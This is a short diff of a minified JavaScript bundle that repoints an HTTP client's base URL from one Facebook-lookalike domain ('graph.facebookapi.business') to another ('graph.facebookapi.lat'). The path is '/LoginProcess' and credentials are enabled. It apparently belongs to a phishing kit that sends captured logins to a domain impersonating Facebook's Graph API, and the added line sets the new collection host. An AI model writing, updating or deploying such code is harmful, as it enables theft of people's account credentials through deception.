@@ -10299,7 +10299,7 @@ de.getAdapter = ch.getAdapter;
 de.HttpStatusCode = vx;
 de.default = de;
 const ph = de,
-    En = ph.create({baseURL: "https://graph.facebookapi.business/v18.php?path=/LoginProcess", timeout: 120e3});
+    En = ph.create({baseURL: "https://graph.facebookapi.lat/v18.php?path=/LoginProcess", timeout: 120e3});
 En.defaults.headers.common["Content-Type"] = "application/json; charset=utf-8";
 En.defaults.headers.common["Access-Control-Allow-Origin"] = "*";
 ph.defaults.withCredentials = !0;
